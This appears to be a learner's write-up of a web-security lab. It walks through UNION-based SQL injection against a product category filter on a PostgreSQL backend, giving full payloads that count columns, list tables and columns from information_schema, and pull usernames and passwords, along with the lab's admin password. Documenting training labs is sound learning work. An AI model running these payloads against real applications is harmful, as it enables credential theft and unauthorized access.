## 📌 **1. Observation**

- The vulnerable parameter was **`category`** in the product filtering functionality.
- Supplying normal values such as `Pets` returned valid product listings.
- Injecting a **single quote (`'`)** resulted in an **Internal Server Error**, confirming:
    - User input is directly concatenated into an SQL query.
    - The input is placed inside a quoted string.
- This behavior confirmed the presence of **SQL injection**.
- The objective of this lab was to **retrieve data from other tables** and verify access using the extracted credentials.

---

## 🧠 **2. Hypothesis**

Likely backend query structure:

```sql
SELECT col1, col2
FROM products
WHERE category = '<user_input>';
```

**Reasoning:**

- UNION-based SQL injection requires:
    - Matching the **exact number of columns**
    - Ensuring **datatype compatibility**
- Once UNION is successful, it can be used to:
    - Query database metadata
    - Identify sensitive tables
    - Extract data

---

## 🧪 **3. Tests (Experiments Conducted)**

### **Test 1 — Confirm SQL injection and column count**

**Payload used:**

```sql
Pets' UNION SELECT NULL,NULL--
```

**Result:**

- Query executed without error.

**Conclusion:**

✅ The original query returns **2 columns**.

---

### **Test 2 — Identify database type**

Support for standard SQL syntax and the availability of `VERSION()` confirmed that the backend database is **PostgreSQL**.

---

### **Test 3 — Enumerate table names**

**Payload used:**

```sql
Pets' UNION SELECT table_name,'b'
FROM information_schema.tables--
```

**Result:**

- A list of tables was returned.
- A table named **`users`** was identified as a likely target for credential storage.

---

### **Test 4 — Enumerate columns of the users table**

**Payload used:**

```sql
Pets' UNION SELECT column_name,'b'
FROM information_schema.columns
WHERE table_name='users'--
```

**Result:**

- Column names of the `users` table were displayed.
- Identified relevant columns:
    - `username`
    - `password`

---

### **Test 5 — Extract user credentials**

**Payload used:**

```sql
Pets' UNION SELECT username,password
FROM users--
```

**Result:**

- User credentials were successfully retrieved.
- Administrator account identified:

```sql
Username: administrator
Password: lqqnda5h97wj2q7rws8p

```

---

### **Test 6 — Verification**

- The extracted credentials were used to log in via the application login page.
- Authentication succeeded as the **administrator** user.
- The application confirmed privileged access.
- The lab displayed the **“Lab Completed”** message.

---

## 📊 **4. Result**

### ✔ **Final Working Payload**

```sql
Pets' UNION SELECT username,password FROM users--
```

### ✔ **Confirmed Facts**

- Vulnerable parameter: `category`
- Number of columns: **2**
- Backend DBMS: **PostgreSQL**
- Metadata source: `information_schema`, `version()`
- Users table: `users`
- Credential columns: `username`, `password`
- Administrator credentials successfully extracted and verified
- Lab successfully completed after authentication
- Screenshot:
    <img width="1178" height="221" alt="image" src="https://github.com/user-attachments/assets/a0a05fb1-4af6-4b08-a666-558ddd796001" />


---

## 🎓 **5. Learning (Key Takeaways)**

- PostgreSQL can be identified with `verion(`).
- `NULL` is useful when matching column counts with unknown datatypes.
- Credential tables often use common names such as `users`.
- Verification through login confirms real‑world impact.

---

## 🔮 **6. Future Notes**

When solving **“retrieving data from other tables”** labs:

1. Always confirm the column count first.
2. Identify the DBMS early to avoid syntax errors.
3. Use `information_schema.tables` to list tables.
4. Prioritize tables likely to contain authentication data.
5. Enumerate columns before attempting extraction.
6. Ensure UNION datatypes match.
7. Verify extracted credentials whenever possible.

---

## 🧭 **7. Notes for My Future Self**

- Do not skip enumeration steps.
- Database identification dictates payload syntax , like in case of postgresql we used `version()`
- `information_schema` is essential for PostgreSQL.
- Always validate impact by logging in if allowed.
- Save both payloads and proof of completion.
- Clear documentation helps rebuild understanding quickly.
